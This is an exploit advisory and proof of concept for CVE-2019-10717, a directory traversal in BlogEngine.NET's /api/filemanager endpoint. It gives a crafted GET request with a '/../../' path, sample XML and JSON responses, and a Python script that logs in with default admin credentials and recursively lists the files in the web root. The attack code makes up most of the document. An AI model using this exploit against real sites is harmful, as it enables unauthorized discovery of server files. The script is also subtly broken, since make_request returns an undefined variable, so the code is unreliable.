# Date: 24 Jun 2019
# Exploit Author: Aaron Bishop
# Vendor Homepage: https://blogengine.io/
# Version: v3.3.7
# Tested on: 3.3.7, 3.3.6
# CVE : 2019-10717

1. Description
==============

BlogEngine.NET is vulnerable to a directory traversal.  The page parameter, passed to /api/filemanager, reveals the contents of the directory.

2. Proof of Concept
=============

Log in to the application and submit a GET request to /api/filemanager:

Request:

~~~
GET /api/filemanager?path=/../../ HTTP/1.1
Host: $RHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: $COOKIE
Connection: close
Upgrade-Insecure-Requests: 1
~~~

Depending on how the request is submitted, the response may be XML or JSON

XML Response

~~~
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/xml; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 15 May 2019 01:58:46 GMT
Connection: close
Content-Length: 13030

<ArrayOfFileInstance xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/BlogEngine.Core.FileSystem">
<FileInstance>
    <Created>5/14/2019 6:58:46 PM</Created>
    <FileSize></FileSize>
    <FileType>Directory</FileType>
    <FullPath>~/App_Data/files/../..</FullPath>
    <IsChecked>false</IsChecked>
    <Name>...</Name>
    <SortOrder>0</SortOrder>
</FileInstance>
...
~~~

JSON Response

~~~
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 15 May 2019 02:35:13 GMT
Connection: close
Content-Length: 10011

[
    {
        "IsChecked":false,
        "SortOrder":0,
        "Created":"5/14/2019 7:35:13 PM",
        "Name":"...",
        "FileSize":"",
        "FileType":0,
        "FullPath":"~/App_Data/files/../..",
        "ImgPlaceholder":""
    }
...
~~~

import argparse
import json
import os
import re
import requests
import sys

"""
Exploit for CVE-2019-10717

CVE Identified by: Aaron Bishop
Exploit written by: Aaron Bishop

Outputs list of filenames found in web root

python exploit.py -t $RHOST

?path=/../..
/../../archive.aspx
/../../archive.aspx.cs
/../../archive.aspx.designer.cs
/../../BlogEngine.NET.csproj
/../../BlogEngine.NET.csproj.user
/../../contact.aspx
/../../contact.aspx.cs
/../../contact.aspx.designer.cs
"""

urls = {
        "login": "/Account/login.aspx",
        "traversal": "/api/filemanager"
       }

def make_request(session, method, target, data={}):
    proxies = {
            "http": "127.0.0.1:8080",
            "https": "127.0.0.1:8080"
              }
    if method == &#039;GET&#039;:
        r = requests.Request(method, target, params=data)
    elif method == &#039;POST&#039;:
        r = requests.Request(method, target, data=data)
    return resp.text

def login(session, host, user, passwd):
    resp = make_request(session, &#039;GET&#039;, host+urls.get(&#039;login&#039;))
    login_form = re.findall(&#039;<input\s+.*?name="(?P<name>.*?)"\s+.*?(?P<tag>\s+value="(?P<value>.*)")?\s/>&#039;, resp)
    login_data = dict([(i[0],i[2]) for i in login_form])
    login_data.update({&#039;ctl00$MainContent$LoginUser$UserName&#039;: user})
    login_data.update({&#039;ctl00$MainContent$LoginUser$Password&#039;: passwd})
    resp = make_request(session, &#039;POST&#039;, host+urls.get(&#039;login&#039;), login_data)

def parse(body, path, outfile):
    paths = json.loads(body)
    new_paths = set()
    for i in paths:
        if i.get(&#039;FileType&#039;) == 0:
            new_paths.add(i.get(&#039;FullPath&#039;))
        else:
            outfile.write("{path}\n".format(path=i.get(&#039;FullPath&#039;)))
    return new_paths

def traverse(session, host, paths, outfile, visited=set()):
    paths = set(paths) - visited
    for path in paths:
        print path
        outfile.write("\n?path={path}\n".format(path=path))
        visited.add(path)
        resp = make_request(session, &#039;GET&#039;, host+urls.get(&#039;traversal&#039;), data=dict(path=path))
        new_paths = parse(resp, path, outfile)
        if new_paths:
            traverse(session, host, new_paths, outfile, visited)

def main(host, user, passwd, root, outfile):
    with requests.Session() as s:
        login(s, host, user, passwd)
        traverse(s, host, root, outfile)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=&#039;Exploit CVE-2019-10717 Path traversal&#039;)
    parser.add_argument(&#039;-t&#039;, &#039;--target&#039;, action="store", dest="target", required=True, help=&#039;Target host&#039;)
    parser.add_argument(&#039;-u&#039;, &#039;--user&#039;, default="admin", action="store", dest="user", help=&#039;Account on blog&#039;)
    parser.add_argument(&#039;-p&#039;, &#039;--passwd&#039;, default="admin", action="store", dest="passwd", help=&#039;Password for account&#039;)
    parser.add_argument(&#039;-r&#039;, &#039;--root&#039;, nargs=&#039;+&#039;, default="/../..", help=&#039;Starting paths&#039;)
    parser.add_argument(&#039;-s&#039;, &#039;--ssl&#039;, action="store_true", help="Force SSL")
    parser.add_argument(&#039;-o&#039;, &#039;--outfile&#039;, type=argparse.FileType(&#039;w&#039;), default=&#039;CVE-2019-10717.txt&#039;)
    args = parser.parse_args()

    protocol = "https://" if args.ssl else "http://"
    if isinstance(args.root, str):
        args.root = [args.root]
    main(protocol + args.target, args.user, args.passwd, args.root, args.outfile)

